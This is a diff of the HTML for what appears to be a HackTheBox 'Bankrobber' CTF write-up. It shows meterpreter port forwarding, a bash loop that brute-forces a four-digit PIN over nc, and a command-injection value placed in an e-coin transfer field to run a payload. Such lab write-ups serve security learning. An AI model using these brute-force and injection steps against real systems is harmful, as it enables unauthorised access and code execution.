@@ -43,7 +43,7 @@
 <meta property="og:image" content="https://ph-payas0.github.io/img/bank/bank-rooted!.png">
 <meta property="og:image" content="https://ph-payas0.github.io/img/bank/bank-root.png">
 <meta property="article:published_time" content="2020-02-20T10:35:26.000Z">
-<meta property="article:modified_time" content="2020-03-08T19:42:18.280Z">
+<meta property="article:modified_time" content="2020-03-08T19:50:57.200Z">
 <meta property="article:author" content="medz">
 <meta property="article:tag" content="ctf">
 <meta property="article:tag" content="pentest">
@@ -321,16 +321,18 @@
 <p>I uploaded it to the Bankrobber and execute it, then I setup a meterpreter session:</p>
 <p>Metasploit meterpreter</p>
 <p><img src="/img/bank/bank-metasploit.png" alt="HackTheBox-Bankrobber/bank-metasploit.png" title="Bank digit code"></p>
+<p>Now that I have the meterpreter session next I did is Port forwarding</p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line">root <span class="keyword">in</span> htb/boxes/Bankrobber</span><br><span class="line">meterpreter &gt; portfwd add -l 910 -p 910 -r 127.0.0.1</span><br><span class="line">[*] Local TCP relay created: :910 &lt;-&gt; 127.0.0.1:910</span><br></pre></td></tr></table></figure>
 
-<p>And connect it to the port using <code>nc</code>, then I tried to input a digit code <code>1234</code></p>
+<p>And connect it to the port using <code>nc -vn 127.0.0.1</code> and it works! Next I tried to input a digit code <code>1234</code></p>
 <p><img src="/img/bank/bank-pincode-wr.png" alt="HackTheBox-Bankrobber/bank-pincodewr.png" title="Bank digit code"></p>
-<h3 id="Brute-force-digit-code"><a href="#Brute-force-digit-code" class="headerlink" title="Brute force digit code"></a>Brute force digit code</h3><p>I decided to bruteforce the digit code using <code>bash</code> command line’ even that I have a feeling that I could get blocked by doing this.</p>
+<h3 id="Brute-force-digit-code"><a href="#Brute-force-digit-code" class="headerlink" title="Brute force digit code"></a>Brute force digit code</h3><p>Since I don’t know what is the exact digit code here, I decided to bruteforce it using <code>bash</code> command line’ even that I have a feeling that I could get blocked by doing this.</p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line">root <span class="keyword">in</span> htb/boxes/Bankrobber</span><br><span class="line">❯ <span class="keyword">for</span> i <span class="keyword">in</span> &#123;0...9&#125;&#123;0...9&#125;&#123;0...9&#125;&#123;0...9&#125;; <span class="keyword">do</span> <span class="built_in">echo</span> <span class="variable">$i</span>; <span class="built_in">echo</span> <span class="variable">$i</span> | nc -vn 127.0.0.1 910; <span class="keyword">done</span></span><br></pre></td></tr></table></figure>
 
 <p>After a seconds’ I get now the right digit code – <code>0021</code></p>
 <p><img src="/img/bank/bank-right-pin.png" alt="HackTheBox-Bankrobber/bank-right-pin.png" title="Bank digit code"></p>
-<p>When I log in with the PIN, I can transfer e-coins and I see that the <code>transfer.exe</code> command is executed:</p>
+<p>When I log in with this PIN, I can transfer e-coins and I see that the <code>transfer.exe</code> command is executed:</p>
+<p>   ⇒ [$] Executing e-coin transfer tool: C:\Users\admin\Documents\transfer.exe</p>
 <p><img src="/img/bank/bank-transfer0021.png" alt="HackTheBox-Bankrobber/bank-transfer0021.png" title="Bank digit code"></p>
 <h3 id="Remote-Code-Execution-RCE"><a href="#Remote-Code-Execution-RCE" class="headerlink" title="Remote Code Execution (RCE)"></a>Remote Code Execution (RCE)</h3><p>Now, theres a possible RCE on that process.<br>I exploited the E-coin transfer by running my payload inside the Bankrobber machine’ and create <code>meterpreter</code> sessions.<br>Instead of putting amount of E-Coins in transfer. I executed my payload with this line.</p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line">&amp; ..\\..\\..\\..\\..\\..\Users\\C:\Users\Cortin\payload.exe</span><br></pre></td></tr></table></figure>
